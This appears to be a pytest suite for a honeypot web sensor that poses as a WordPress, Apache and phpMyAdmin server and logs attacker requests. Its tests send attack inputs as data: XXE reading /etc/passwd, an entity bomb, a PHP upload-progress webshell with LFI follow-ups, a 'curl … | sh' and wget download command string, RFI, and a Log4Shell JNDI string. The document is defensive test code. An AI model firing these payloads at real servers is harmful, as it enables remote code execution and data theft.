"""End-to-end tests with real clients (http.client, ssl sockets, raw sockets) against the server."""

from __future__ import annotations

import asyncio
import http.client
import ipaddress
import json
import platform
import re
import socket
import ssl
import time
from typing import Any

import pytest
from conftest import Harness

from web_sensor.site import Site


def _get(port: int, method: str, path: str, **kw: Any) -> tuple[int, list[tuple[str, str]], bytes]:
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    conn.request(method, path, **kw)
    r = conn.getresponse()
    body = r.read()
    out = (r.status, r.getheaders(), body)
    conn.close()
    return out


async def get(h: Harness, method: str, path: str, **kw: Any) -> tuple[int, dict[str, str], bytes]:
    status, headers, body = await asyncio.to_thread(_get, h.http, method, path, **kw)
    return status, {k.lower(): v for k, v in headers}, body


def by_type(events: list[Any], type_: str) -> list[Any]:
    return [e for e in events if e.type == type_]


async def test_home_is_wordpress(harness: Harness) -> None:
    status, headers, body = await get(harness, "GET", "/", headers={"Host": "shop.example"})
    assert status == 200
    assert headers["server"] == "Apache/2.4.58 (Ubuntu)"
    assert headers["x-powered-by"] == "PHP/8.3.6"
    assert 'rel="https://api.w.org/"' in headers["link"]
    assert b'<meta name="generator" content="WordPress 6.8.1" />' in body
    assert b"twentytwentyfour" in body
    assert b"http://shop.example/wp-login.php" not in body  # no hard-coded foreign host


async def test_header_order_php(harness: Harness) -> None:
    raw = await harness.raw(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    names = [ln.split(b":")[0] for ln in raw.split(b"\r\n\r\n")[0].split(b"\r\n")[1:]]
    assert names == [
        b"Date", b"Server", b"X-Powered-By", b"Link", b"Vary", b"Transfer-Encoding",
        b"Connection", b"Content-Type",
    ]  # fmt: skip


async def test_gzip_negotiation(harness: Harness) -> None:
    raw = await harness.raw(
        b"GET / HTTP/1.1\r\nHost: x\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n"
    )
    head, _, body = raw.partition(b"\r\n\r\n")
    assert b"Content-Encoding: gzip" in head
    assert b"Transfer-Encoding" not in head
    assert body.startswith(b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03")
    import gzip

    assert b"WordPress" in gzip.decompress(body)


async def test_wp_login_records_credentials(harness: Harness) -> None:
    status, headers, body = await get(harness, "GET", "/wp-login.php")
    assert status == 200 and b'name="log"' in body
    assert "wordpress_test_cookie" in headers["set-cookie"]
    assert headers["expires"] == "Wed, 11 Jan 1984 05:00:00 GMT"
    status, _, body = await get(
        harness,
        "POST",
        "/wp-login.php",
        body="log=admin&pwd=hunter2&wp-submit=Log+In&testcookie=1",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    assert status == 200
    assert b"The password you entered for the username <strong>admin</strong> is incorrect" in body
    status, _, body = await get(
        harness,
        "POST",
        "/wp-login.php",
        body="log=nobody&pwd=x",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    assert b"The username <strong>nobody</strong> is not registered on this site" in body
    logins = by_type(await harness.events(), "login_attempt")
    assert [(e.data["username"], e.data["password"], e.data["method"]) for e in logins] == [
        ("admin", "hunter2", "wp-login"),
        ("nobody", "x", "wp-login"),
    ]
    assert all(e.data["success"] is False for e in logins)


async def test_xmlrpc_get_and_multicall(harness: Harness) -> None:
    status, headers, body = await get(harness, "GET", "/xmlrpc.php")
    assert status == 405 and body == b"XML-RPC server accepts POST requests only."
    xml = (
        "<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName><params><param>"
        "<value><array><data>"
        + "".join(
            f"<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
            f"<member><name>params</name><value><array><data>"
            f"<value><string>user{i}</string></value><value><string>pw{i}</string></value>"
            f"</data></array></value></member></struct></value>"
            for i in range(3)
        )
        + "</data></array></value></param></params></methodCall>"
    )
    status, headers, body = await get(harness, "POST", "/xmlrpc.php", body=xml)
    assert status == 200 and headers["content-type"] == "text/xml"
    assert body.count(b"<int>403</int>") == 3
    assert b"Incorrect username or password." in body
    logins = by_type(await harness.events(), "login_attempt")
    assert [(e.data["username"], e.data["password"]) for e in logins] == [
        ("user0", "pw0"),
        ("user1", "pw1"),
        ("user2", "pw2"),
    ]
    assert {e.data["method"] for e in logins} == {"xmlrpc"}


async def test_xmlrpc_single_and_list_methods(harness: Harness) -> None:
    one = (
        "<methodCall><methodName>wp.getUsersBlogs</methodName><params>"
        "<param><value>admin</value></param><param><value>pw</value></param></params></methodCall>"
    )
    _, _, body = await get(harness, "POST", "/xmlrpc.php", body=one)
    assert b"<name>faultCode</name>" in body and b"<int>403</int>" in body
    lm = "<methodCall><methodName>system.listMethods</methodName></methodCall>"
    _, _, body = await get(harness, "POST", "/xmlrpc.php", body=lm)
    assert b"wp.getUsersBlogs" in body and b"system.multicall" in body
    unk = "<methodCall><methodName>foo.bar</methodName></methodCall>"
    _, _, body = await get(harness, "POST", "/xmlrpc.php", body=unk)
    assert b"requested method foo.bar does not exist" in body


async def test_xmlrpc_xxe_is_not_resolved(harness: Harness) -> None:
    xml = (
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
        "<methodCall><methodName>&x;</methodName></methodCall>"
    )
    status, _, body = await get(harness, "POST", "/xmlrpc.php", body=xml)
    assert status == 200 and b"root:" not in body and b"-32700" in body
    bomb = (
        '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;">]>'
        "<methodCall><methodName>&b;</methodName></methodCall>"
    )
    started = time.monotonic()
    _, _, body = await get(harness, "POST", "/xmlrpc.php", body=bomb)
    assert b"-32700" in body and time.monotonic() - started < 2


async def test_wp_json_users_and_enumeration(harness: Harness) -> None:
    status, headers, body = await get(harness, "GET", "/wp-json/wp/v2/users")
    assert status == 200 and headers["content-type"] == "application/json; charset=UTF-8"
    users = json.loads(body)
    assert users[0]["slug"] == "admin" and users[0]["id"] == 1
    assert b"\\/author\\/admin\\/" in body  # PHP escapes slashes
    status, headers, _ = await get(harness, "GET", "/?author=1")
    assert status == 301 and headers["location"].endswith("/author/admin/")
    assert headers["x-redirect-by"] == "WordPress"
    status, _, body = await get(harness, "GET", "/wp-json/")
    assert json.loads(body)["namespaces"][1] == "wp/v2"
    events = by_type(await harness.events(), "http_request")
    assert "wp_user_enum" in events[0].data["flags"]


async def test_wp_admin_redirects_to_login(harness: Harness) -> None:
    status, headers, _ = await get(harness, "GET", "/wp-admin/", headers={"Host": "h.example"})
    assert status == 302
    assert headers["location"].startswith("http://h.example/wp-login.php?redirect_to=")
    status, headers, _ = await get(harness, "GET", "/wp-admin")
    assert status == 301 and headers["location"].endswith("/wp-admin/")


async def test_phpmyadmin_login(harness: Harness) -> None:
    for root in ("/phpmyadmin/", "/pma/"):
        status, headers, body = await get(harness, "GET", root)
        assert status == 200 and b"Welcome to <bdo" in body and b"pma_username" in body
        assert headers["x-frame-options"] == "DENY"
        raw = await harness.raw(
            f"GET {root} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n".encode()
        )
        assert b"Set-Cookie: phpMyAdmin=" in raw and b"Set-Cookie: pma_lang=en" in raw
    status, _, body = await get(
        harness,
        "POST",
        "/phpmyadmin/index.php?route=/",
        body="pma_username=root&pma_password=toor&server=1",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    assert (
        b"Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: YES)"
        in body
    )
    logins = by_type(await harness.events(), "login_attempt")
    assert (logins[-1].data["username"], logins[-1].data["password"]) == ("root", "toor")
    assert logins[-1].data["method"] == "phpmyadmin"
    status, headers, _ = await get(harness, "GET", "/phpmyadmin")
    assert status == 301
    status, _, _ = await get(harness, "GET", "/phpmyadmin/setup/index.php")
    assert status == 404


async def test_phpinfo_is_bait(harness: Harness) -> None:
    status, headers, body = await get(
        harness, "GET", "/info.php?x=%3Cb%3E", headers={"User-Agent": "T/1", "Cookie": "a=b"}
    )
    text = body.decode()
    assert status == 200
    assert 'session.upload_progress.enabled</td><td class="v">On' in text
    assert "Apache 2.0 Handler" in text and 'PHP Version </td><td class="v">8.3.6' in text
    assert "&lt;b&gt;" in text and "<b>" not in text.split("PHP Variables")[1].split("<hr")[0]
    # nothing about the machine that built the template or runs the tests
    for leak in (platform.release(), socket.gethostname(), "docker", "suckerpot", "honeypot"):
        assert not leak or leak.lower() not in text.lower()
    private = [
        q
        for q in re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", text)
        if ipaddress.ip_address(q).is_private and q != "127.0.0.1"
    ]
    server_ip = harness.sensor.site.p.server_ip
    assert set(private) <= {server_ip}
    status, _, _ = await get(harness, "GET", "/phpinfo.php")
    assert status == 200


async def test_apache_owned_paths(harness: Harness) -> None:
    status, _, body = await get(harness, "GET", "/server-status")
    assert status == 403 and b"You don't have permission" in body
    status, _, body = await get(harness, "GET", "/.env")
    assert status == 404 and body.startswith(b"<!DOCTYPE HTML PUBLIC")
    status, _, _ = await get(harness, "GET", "/.git/config")
    assert status == 404
    status, _, _ = await get(harness, "GET", "/.htaccess")
    assert status == 403
    status, _, _ = await get(harness, "GET", "/cgi-bin/")
    assert status == 404
    events = by_type(await harness.events(), "http_request")
    assert "recon_dotfile" in events[1].data["flags"] and "config_leak" in events[1].data["flags"]


async def test_wp_404_and_static_assets(harness: Harness) -> None:
    status, headers, body = await get(harness, "GET", "/no-such-page/")
    assert status == 404 and b"Page not found" in body and "x-powered-by" in headers
    status, headers, body = await get(harness, "GET", "/readme.html")
    assert status == 200 and b"Version 6.8.1" in body
    assert headers["accept-ranges"] == "bytes" and headers["etag"].startswith('"')
    status, headers, body = await get(
        harness, "GET", "/wp-content/themes/twentytwentyfour/style.css"
    )
    assert b"Theme Name: Twenty Twenty-Four" in body
    status, headers, _ = await get(harness, "GET", "/wp-content/uploads/")
    assert status == 200 and "x-powered-by" not in headers
    status, headers, _ = await get(harness, "GET", "/favicon.ico")
    assert status == 302 and headers["location"].endswith("w-logo-blue-white-bg.png")


async def test_robots_and_conditionals(harness: Harness) -> None:
    status, _, body = await get(harness, "GET", "/robots.txt")
    assert status == 200 and b"Disallow: /wp-admin/" in body
    status, headers, _ = await get(harness, "GET", "/license.txt")
    etag = headers["etag"]
    status, _, body = await get(harness, "GET", "/license.txt", headers={"If-None-Match": etag})
    assert status == 304 and body == b""
    status, headers, body = await get(
        harness, "GET", "/license.txt", headers={"Range": "bytes=0-8"}
    )
    assert (
        status == 206 and body == b"WordPress" and headers["content-range"].startswith("bytes 0-8/")
    )


async def test_keepalive_and_http10(harness: Harness) -> None:
    reader, writer = await asyncio.open_connection("127.0.0.1", harness.http)
    for i in range(1, 101):
        writer.write(b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n")
        await writer.drain()
        head = await reader.readuntil(b"\r\n\r\n")
        length = int(head.split(b"Content-Length: ")[1].split(b"\r\n")[0])
        await reader.readexactly(length)
        if i < 100:
            assert b"Connection: close" not in head
        else:
            assert b"Connection: close" in head
    assert await reader.read(10) == b""  # closed after the 100th request
    writer.close()
    raw = await harness.raw(b"GET /.env HTTP/1.0\r\n\r\n")
    assert b"Connection: close" in raw
    raw = await harness.raw(
        b"GET /.env HTTP/1.1\r\nHost: x\r\nConnection: keep-alive\r\n\r\n", wait=0.3
    )
    assert b"Keep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\n" in raw


async def test_idle_keepalive_closes(start_with: Any) -> None:
    async with start_with(keepalive_timeout=0.3) as h:
        reader, writer = await asyncio.open_connection("127.0.0.1", h.http)
        writer.write(b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n")
        await reader.readuntil(b"</html>\n")
        assert await asyncio.wait_for(reader.read(10), 2) == b""
        writer.close()


async def test_head_and_options(harness: Harness) -> None:
    status, headers, body = await get(harness, "HEAD", "/readme.html")
    assert status == 200 and body == b"" and int(headers["content-length"]) > 100
    status, headers, _ = await get(harness, "OPTIONS", "/readme.html")
    assert headers["allow"] == "GET,POST,OPTIONS,HEAD"
    raw = await harness.raw(b"OPTIONS * HTTP/1.1\r\nHost: x\r\n\r\n", wait=0.3)
    assert raw.endswith(b"Content-Length: 0\r\n\r\n") and b"Allow" not in raw
    status, headers, body = await get(harness, "TRACE", "/")
    assert status == 405 and headers["allow"] == ""


async def test_http09(harness: Harness) -> None:
    raw = await harness.raw(b"GET /.env\r\n")
    assert raw.startswith(b"<!DOCTYPE HTML") and b"HTTP/1" not in raw


async def test_body_cap_and_hash(harness: Harness) -> None:
    import hashlib

    payload = b"A" * 2000
    status, _, _ = await get(harness, "POST", "/.env", body=payload)
    ev = by_type(await harness.events(), "http_request")[-1]
    assert ev.data["body_length"] == 2000
    assert ev.data["body_sha256"] == hashlib.sha256(payload).hexdigest()
    assert ev.data["body_preview"] == "A" * 2000
    raw = await harness.raw(
        b"POST /.env HTTP/1.1\r\nHost: x\r\nContent-Length: 5000000\r\n\r\n", wait=0.5
    )
    assert raw.startswith(b"HTTP/1.1 413 Request Entity Too Large")
    assert b"Content-Length:" not in raw.split(b"\r\n\r\n")[0]
    # chunked bodies are capped as well
    chunk = b"%x\r\n" % 600_000 + b"B" * 600_000 + b"\r\n"
    raw = await harness.raw(
        b"POST /.env HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n" + chunk * 3,
        wait=1.0,
    )
    assert raw.startswith(b"HTTP/1.1 413")
    ev = by_type(await harness.events(), "http_request")[-1]
    assert ev.data["body_length"] <= 1024 * 1024 and "oversized_body" in ev.data["flags"]


async def test_php2shell_upload_progress(harness: Harness) -> None:
    boundary = "----x1"
    body = (
        f'--{boundary}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"<?php system($_GET['c']); ?>\r\n--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n\r\ndata\r\n--{boundary}--\r\n'
    )
    status, _, _ = await get(
        harness,
        "POST",
        "/index.php",
        body=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Cookie": "PHPSESSID=abcDEF123",
        },
    )
    assert status == 200  # a vulnerable-looking server answers normally; nothing is executed
    ev = by_type(await harness.events(), "http_request")[-1]
    assert {"php2shell", "upload_progress", "php_code", "session_cookie"} <= set(ev.data["flags"])
    assert ev.data["cve"] == ["CVE-2026-109618", "CVE-2026-109619"]
    p = ev.data["php2shell"]
    assert p["phpsessid"] == "abcDEF123" and p["value_preview"].startswith("<?php system(")
    assert p["progress_before_file"] is True and p["multipart"] is True


async def test_php2shell_lfi_followup(harness: Harness) -> None:
    await get(
        harness,
        "POST",
        "/",
        body="PHP_SESSION_UPLOAD_PROGRESS=x",
        headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": "PHPSESSID=sess42"},
    )
    status, _, _ = await get(harness, "GET", "/index.php?file=/tmp/sess_sess42")
    assert status == 200
    status, _, _ = await get(
        harness,
        "GET",
        "/?page=php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_sess42",
    )
    events = by_type(await harness.events(), "http_request")
    first, second, third = events[-3:]
    assert "upload_progress" in first.data["flags"]
    assert {"lfi", "session_include", "php2shell", "session_ref_match"} <= set(second.data["flags"])
    assert second.data["php2shell"]["session_ref"] == "sess42"
    assert second.data["php2shell"]["session_ref_same_ip"] is True
    assert "php2shell" in third.data["flags"] and third.data["cve"]


async def test_upload_progress_without_php_code_is_only_a_probe(harness: Harness) -> None:
    await get(
        harness,
        "POST",
        "/",
        body="PHP_SESSION_UPLOAD_PROGRESS=hello",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    await get(harness, "GET", "/index.php?PHP_SESSION_UPLOAD_PROGRESS=1")
    await get(harness, "GET", "/index.php?file=/tmp/sess_neverseen")  # a bare session include
    events = by_type(await harness.events(), "http_request")
    for ev in events[-3:-1]:
        assert "upload_progress" in ev.data["flags"] and "php2shell" not in ev.data["flags"]
        assert not ev.data["cve"]
    last = events[-1]
    assert "session_include" in last.data["flags"] and "php2shell" not in last.data["flags"]
    assert not last.data["cve"]


async def test_download_attempts_recorded_only(harness: Harness) -> None:
    payload = "cmd=cd /tmp; wget http://198.51.100.7/x.sh -O x; curl -s http://203.0.113.9/y|sh; tftp -g -r z 192.0.2.5"
    await get(harness, "POST", "/index.php", body=payload, headers={"Content-Type": "text/plain"})
    await get(harness, "GET", "/x.php?file=http://198.51.100.8/shell.txt")
    await get(harness, "GET", "/", headers={"User-Agent": "${jndi:ldap://192.0.2.77:1389/a}"})
    events = await harness.events()
    urls = {(e.data["tool"], e.data["url"]) for e in by_type(events, "download_attempt")}
    assert ("wget", "http://198.51.100.7/x.sh") in urls
    assert ("curl", "http://203.0.113.9/y") in urls
    assert ("tftp", "tftp://192.0.2.5/z") in urls
    assert ("rfi", "http://198.51.100.8/shell.txt") in urls
    assert any(t == "jndi" for t, _ in urls)
    reqs = by_type(events, "http_request")
    assert "rce" in reqs[0].data["flags"] and "log4shell" in reqs[2].data["flags"]


async def test_basic_auth_recorded(harness: Harness) -> None:
    import base64

    token = base64.b64encode(b"admin:s3cret").decode()
    await get(harness, "GET", "/server-status", headers={"Authorization": f"Basic {token}"})
    logins = by_type(await harness.events(), "login_attempt")
    assert (logins[0].data["username"], logins[0].data["password"], logins[0].data["method"]) == (
        "admin", "s3cret", "http-basic",
    )  # fmt: skip


async def test_event_shape_and_session(harness: Harness) -> None:
    reader, writer = await asyncio.open_connection("127.0.0.1", harness.http)
    for _ in range(2):
        writer.write(
            b"GET /a?x=1 HTTP/1.1\r\nHost: h\r\nUser-Agent: UA/1\r\nX-One: 1\r\nX-One: 2\r\n\r\n"
        )
        await writer.drain()
        head = await reader.readuntil(b"\r\n\r\n")
        n = (
            int(head.split(b"Content-Length: ")[1].split(b"\r\n")[0])
            if b"Content-Length" in head
            else 0
        )
        if n:
            await reader.readexactly(n)
        else:
            await reader.read(65536)
    writer.close()
    events = await harness.events(wait=0.4)
    sids = {e.session_id for e in events}
    assert len(sids) == 1
    kinds = [e.type for e in events]
    assert kinds[0] == "connect" and kinds[-1] == "disconnect"
    req = by_type(events, "http_request")[0]
    d = req.data
    assert (d["method"], d["path"], d["query"], d["user_agent"], d["http_version"]) == (
        "GET", "/a", "x=1", "UA/1", "HTTP/1.1",
    )  # fmt: skip
    assert d["headers"]["X-One"] == "1, 2" and d["status"] == 404 and d["tls"] is False
    assert req.dst_port == 80
    assert list(d["headers"])[:2] == ["Host", "User-Agent"]
    disc = events[-1].data
    assert disc["requests"] == 2 and disc["reason"] == "idle"


async def test_malformed_requests_are_recorded(harness: Harness) -> None:
    raw = await harness.raw(b"\x00\x01garbage\r\n\r\n")
    assert raw.startswith(b"HTTP/1.1 400 Bad Request")
    ev = by_type(await harness.events(), "http_request")[0]
    assert "malformed" in ev.data["flags"] and ev.data["status"] == 400
    assert "garbage" in ev.data["request_head_preview"]


async def test_handler_exception_answers_like_apache(
    harness: Harness, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(self: Site, *a: Any, **k: Any) -> Any:
        raise RuntimeError("secret internals")

    monkeypatch.setattr(Site, "handle", boom)
    raw = await harness.raw(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    assert raw.startswith(b"HTTP/1.1 500 Internal Server Error")
    assert b"secret" not in raw and b"Traceback" not in raw
    ev = by_type(await harness.events(), "http_request")[0]
    assert ev.data["status"] == 500


# -- limits ------------------------------------------------------------------------------------


async def test_slow_headers_get_408(start_with: Any) -> None:
    async with start_with(header_timeout=0.4, header_timeout_max=0.4) as h:
        reader, writer = await asyncio.open_connection("127.0.0.1", h.http)
        writer.write(b"GET / HTTP/1.1\r\nHost: x\r\n")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(65536), 3)
        assert data.startswith(b"HTTP/1.1 408 Request Timeout")
        writer.close()
        ev = by_type(await h.events(), "http_request")
        assert "incomplete_request" in ev[0].data["flags"]


async def test_slow_body_gets_408(start_with: Any) -> None:
    async with start_with(body_timeout=0.4, body_total_timeout=0.4) as h:
        reader, writer = await asyncio.open_connection("127.0.0.1", h.http)
        writer.write(b"POST /.env HTTP/1.1\r\nHost: x\r\nContent-Length: 100\r\n\r\nabc")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(65536), 3)
        assert data.startswith(b"HTTP/1.1 408")
        writer.close()


async def test_per_ip_and_global_caps(start_with: Any) -> None:
    async with start_with(max_per_ip=2) as h:
        conns = [await asyncio.open_connection("127.0.0.1", h.http) for _ in range(3)]
        await asyncio.sleep(0.2)
        r3 = conns[2][0]
        assert await asyncio.wait_for(r3.read(10), 2) == b""  # refused: closed without a response
        conns[0][1].write(b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n")
        assert (await asyncio.wait_for(conns[0][0].readuntil(b"\r\n\r\n"), 2)).startswith(
            b"HTTP/1.1 404"
        )
        for _, w in conns:
            w.close()
    async with start_with(max_connections=1, max_per_ip=5) as h:
        a = await asyncio.open_connection("127.0.0.1", h.http)
        b = await asyncio.open_connection("127.0.0.1", h.http)
        assert await asyncio.wait_for(b[0].read(10), 2) == b""
        a[1].close()
        b[1].close()


async def test_connection_rate_limit_before_work(start_with: Any) -> None:
    async with start_with(conn_rate=0.001, conn_burst=2.0) as h:
        results = []
        for _ in range(4):
            r, w = await asyncio.open_connection("127.0.0.1", h.http)
            w.write(b"GET /.env HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
            results.append(len(await asyncio.wait_for(r.read(65536), 2)) > 0)
            w.close()
        assert results == [True, True, False, False]


async def test_long_lines_and_header_counts(harness: Harness) -> None:
    raw = await harness.raw(b"GET /" + b"a" * 9000 + b" HTTP/1.1\r\nHost: x\r\n\r\n")
    assert raw.startswith(b"HTTP/1.1 414 Request-URI Too Long")
    raw = await harness.raw(b"GET / HTTP/1.1\r\nHost: x\r\nX: " + b"a" * 9000 + b"\r\n\r\n")
    assert b"Size of a request header field exceeds server limit." in raw
    hdrs = b"".join(b"X-%d: a\r\n" % i for i in range(120))
    raw = await harness.raw(b"GET / HTTP/1.1\r\nHost: x\r\n" + hdrs + b"\r\n")
    assert b"The number of request header fields exceeds this server's limit." in raw


# -- TLS ---------------------------------------------------------------------------------------


def _tls_get(h: Harness, sni: str | None) -> tuple[bytes, str | None, str | None]:
    with socket.create_connection(("127.0.0.1", h.https), timeout=5) as raw:
        with h.tls_context().wrap_socket(raw, server_hostname=sni) as s:
            s.sendall(b"GET /.env HTTP/1.1\r\nHost: srv-web01\r\nConnection: close\r\n\r\n")
            data = b""
            while chunk := s.recv(65536):
                data += chunk
            return data, s.version(), (s.cipher() or ("",))[0]


async def test_https_with_sni(harness: Harness) -> None:
    data, version, cipher = await asyncio.to_thread(_tls_get, harness, "shop.example")
    assert data.startswith(b"HTTP/1.1 404 Not Found") and version in ("TLSv1.2", "TLSv1.3")
    events = await harness.events()
    connect = by_type(events, "connect")[0]
    assert connect.data["tls"] is True and connect.data["sni"] == "shop.example"
    assert connect.dst_port == 443
    req = by_type(events, "http_request")[0]
    assert req.data["tls"] is True and req.data["sni"] == "shop.example"


async def test_certificate_looks_like_snakeoil(harness: Harness) -> None:
    from cryptography import x509

    def fetch() -> bytes:
        with socket.create_connection(("127.0.0.1", harness.https), timeout=5) as raw:
            with harness.tls_context().wrap_socket(raw) as s:
                return s.getpeercert(binary_form=True) or b""

    cert = x509.load_der_x509_certificate(await asyncio.to_thread(fetch))
    assert cert.subject == cert.issuer
    assert cert.subject.rfc4514_string() == "CN=srv-web01"
    assert (cert.not_valid_after_utc - cert.not_valid_before_utc).days == 3650
    for bad in ("suckerpot", "honeypot", "test"):
        assert bad not in cert.subject.rfc4514_string().lower()


async def test_plain_http_on_tls_port(harness: Harness) -> None:
    raw = await harness.raw(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n", port=harness.https)
    assert raw.startswith(b"HTTP/1.1 400 Bad Request")
    assert b"You're speaking plain HTTP to an SSL-enabled server port." in raw
    assert b"Server at " + harness.sensor.site.p.server_ip.encode() + b" Port 443" in raw


async def test_garbage_and_failed_handshake_on_tls_port(harness: Harness) -> None:
    raw = await harness.raw(b"\x00\x01\x02\x03binary", port=harness.https, wait=0.5)
    assert raw == b""
    raw = await harness.raw(b"\x16\x03\x01\x00\x10notaclienthello", port=harness.https, wait=0.5)
    events = await harness.events(wait=0.5)
    kinds = [e.data.get("kind") for e in by_type(events, "scan")]
    assert "non_tls_on_tls_port" in kinds and "tls_handshake_failed" in kinds


def _tls_close_notify(h: Harness, partial: bytes | None) -> bool:
    """Handshake, optionally send a partial request, then send close_notify (unwrap)."""
    with socket.create_connection(("127.0.0.1", h.https), timeout=5) as raw:
        s = h.tls_context().wrap_socket(raw)
        if partial:
            s.sendall(partial)
        try:
            s.unwrap()
        except ssl.SSLError, OSError:
            pass
    return True


@pytest.mark.parametrize(
    "partial",
    [
        None,
        b"GET / HTTP/1.1\r\nHo",
        b"POST /.env HTTP/1.1\r\nHost: x\r\nContent-Length: 50\r\n\r\nabc",
    ],
)
async def test_tls_close_notify_is_eof_not_busy_loop(
    harness: Harness, partial: bytes | None
) -> None:
    started = time.monotonic()
    assert await asyncio.to_thread(_tls_close_notify, harness, partial)
    # the loop must stay responsive and the connection must end quickly with a disconnect event
    ticks = 0
    for _ in range(20):
        await asyncio.sleep(0.05)
        ticks += 1
    events = await harness.events(wait=0.3)
    assert by_type(events, "disconnect"), "session was not closed after close_notify"
    assert harness.sensor.total == 0
    assert time.monotonic() - started < 5 and ticks == 20
    disc = by_type(events, "disconnect")[0]
    assert disc.data["duration_s"] < 3


async def test_tls_listener_survives_handshake_flood(harness: Harness) -> None:
    async def poke() -> None:
        r, w = await asyncio.open_connection("127.0.0.1", harness.https)
        w.write(b"\x16\x03\x01\x00\x05hello")
        await w.drain()
        w.close()

    await asyncio.gather(*(poke() for _ in range(40)))
    for _ in range(50):
        if harness.sensor.total == 0:
            break
        await asyncio.sleep(0.1)
    data, _, _ = await asyncio.to_thread(_tls_get, harness, None)
    assert data.startswith(b"HTTP/1.1 404")


async def test_loopback_is_quiet_by_default(tls_files: Any) -> None:
    from dataclasses import replace

    from conftest import FakePublisher

    from web_sensor.config import Config
    from web_sensor.events import EventSink
    from web_sensor.profile import build_profile
    from web_sensor.server import WebSensor, WebServer

    cfg = replace(Config(), host="127.0.0.1", http_port=0, https_port=0)
    pub = FakePublisher()
    sink = EventSink(pub)
    sink.start()
    profile = build_profile(b"q" * 32, 1_790_000_000.0)
    server = WebServer(cfg, WebSensor(cfg, sink, Site(cfg, profile, "x"), None))
    ports = await server.start()
    r, w = await asyncio.open_connection("127.0.0.1", ports["http"])
    w.write(b"HEAD /robots.txt HTTP/1.0\r\n\r\n")
    assert (await r.read(100)).startswith(b"HTTP/1.1 200")
    w.close()
    await asyncio.sleep(0.2)
    await sink.flush()
    assert pub.events == []
    await server.stop()
    await sink.close()
